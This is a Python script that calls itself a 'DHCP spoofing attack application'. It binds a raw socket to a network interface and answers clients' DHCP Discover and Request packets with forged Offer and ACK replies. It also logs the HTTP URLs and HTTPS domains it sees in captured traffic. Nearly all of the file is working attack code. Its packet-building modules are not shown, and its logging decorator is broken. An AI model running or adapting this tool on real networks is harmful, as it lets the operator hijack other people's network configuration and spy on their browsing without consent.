#!/usr/bin/python3 -tt
import argparse
from socket import socket, htons, SOCK_RAW, AF_PACKET, inet_ntoa
from spoofing.packet import parse
from spoofing.assembler import DhcpPacket
from spoofing.ippool import IpPool
import spoofing.html


OFFER = 1
ACK = 2

class log:

    def __init__(self, prefix):
        self.prefix = prefix


    def __call__(self, *args, **kwargs):
        def wrapper (*args, **kwargs):
            r = f(*args, **kwargs)
            params = ' '.join(str(n) for n in args)
            params += ' '.join(str(n) for n in kwargs)
            print(self.prefix.format(f.__name__, params, r))
            return r
        return wrapper

def spoof_init():
    parser = argparse.ArgumentParser(prog='dhcpspoof', description='DHCP spoofing attack application', formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument('-v', '--verbose', action='store_true', help='Runs in verbose mode')
    parser.add_argument('-i', '--interface',  help='Network interface to track', required=True)
    parser.add_argument('-s', '--startip',  help='Initial Ip octet to deliver', default=2,  type=int)
    parser.add_argument('-e', '--endip',  help='End ip last octet to deliver', default=254,  type=int)

    options = parser.parse_args()

    if options.startip > options.endip | 0 > options.startip > 254 | 0> options.endip >254:
        print ('Invalid ip range entry')
        return 0

    ETH_P_ALL = 3
    s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
    s.bind((options.interface, 0))
    #s.getsockname()[4] returns b'\xac\x16-4Y\x96' which seems to be the mac ?

    if options.verbose:
        print ('spoof started with verbose mode on %s' % options.interface)
    else:
        print('spoof started on %s' % options.interface)

    ip_pool = IpPool(options.startip, options.endip)

    spoofing.html.createHistory()

    BUFFER_SIZE = 1518
    while 1:
        recv = s.recv(BUFFER_SIZE)
        packet = parse(recv)
        try:
            if packet.ip.udp.dhcp.type:
                print ('Detected a dhcp packet:')
                if packet.ip.udp.dhcp.type == 1:
                    if packet.ip.udp.dhcp.dhcpOptions.type == b'\x01':
                        print ('    >is a Discover')
                        print("Sending Offer")
                        if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
                            packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                        pacote = DhcpPacket(OFFER, packet.ip.udp.dhcp.transaction_id, packet.origin_mac,
                                            packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
                        # print(pacote)
                        s.send(pacote)
                    elif packet.ip.udp.dhcp.dhcpOptions.type == b'\x03':
                        print ('    >is a Request')
                        print ('Sending ACK')
                        if not packet.ip.udp.dhcp.dhcpOptions.requested_ip:
                            packet.ip.udp.dhcp.dhcpOptions.requested_ip = ip_pool.get_ip_for(packet.origin_mac)
                        pacote = DhcpPacket(ACK, packet.ip.udp.dhcp.transaction_id, packet.origin_mac,
                                            packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
                        s.send(pacote)
        except AttributeError:
            try:
                if packet.ip.tcp:
                    if packet.ip.tcp.http.URL:
                        print(packet.ip.tcp.http.URL)
            except AttributeError:
                try:
                    if packet.ip.tcp:
                        if packet.ip.tcp.https.domain:
                            print(packet.ip.tcp.https.domain)
                except AttributeError:
                    continue